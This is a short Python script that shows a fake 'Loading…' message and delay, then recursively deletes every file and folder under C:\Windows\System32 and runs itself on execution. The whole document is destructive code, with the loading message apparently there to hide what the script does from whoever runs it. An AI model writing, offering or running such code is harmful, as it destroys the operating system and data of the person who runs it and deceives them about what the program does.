import os
import time

def delete_system32():
    print("Loading…")
    time.sleep(2)  # Simulate a delay to mimic loading time
    try:
        path = "C:\\Windows\\System32"
        for root, dirs, files in os.walk(path, topdown=False):
            for name in files:
                os.remove(os.path.join(root, name))
            for name in dirs:
                os.rmdir(os.path.join(root, name))
        print("Deletion process complete.")
    except Exception as e:
        print(f"An error occurred: {e}")

delete_system32()